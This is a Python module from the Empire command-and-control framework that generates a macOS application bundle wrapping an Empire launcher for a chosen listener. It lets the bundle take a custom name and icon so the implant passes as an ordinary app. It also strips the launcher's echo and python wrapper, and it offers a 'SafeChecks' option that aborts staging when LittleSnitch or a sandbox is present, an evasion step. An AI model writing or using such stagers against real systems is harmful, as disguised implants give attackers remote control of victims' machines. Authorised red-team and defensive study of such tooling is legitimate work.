import logging

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Application",
            "Authors": [
                {
                    "Name": "Chris Ross",
                    "Handle": "@xorrior",
                    "Link": "https://twitter.com/xorrior",
                }
            ],
            "Description": "Generates an Empire Application.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "AppIcon": {
                "Description": "Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.",
                "Required": False,
                "Value": "",
            },
            "AppName": {
                "Description": "Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.",
                "Required": False,
                "Value": "",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "out.zip",
            },
            "SafeChecks": {
                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Architecture": {
                "Description": "Architecture to use. x86 or x64",
                "Required": True,
                "Value": "x64",
                "SuggestedValues": ["x64", "x86"],
                "Strict": True,
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        arch = self.options["Architecture"]["Value"]
        icns_path = self.options["AppIcon"]["Value"]
        app_name = self.options["AppName"]["Value"]

        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name,
            language=language,
            user_agent=user_agent,
            safe_checks=safe_checks,
        )

        if launcher == "":
            log.error("Error in launcher command generation.")
            return ""

        disarm = False
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')
        return self.mainMenu.stagergenv2.generate_appbundle(
            launcher_code=launcher,
            arch=arch,
            icon=icns_path,
            app_name=app_name,
            disarm=disarm,
        )
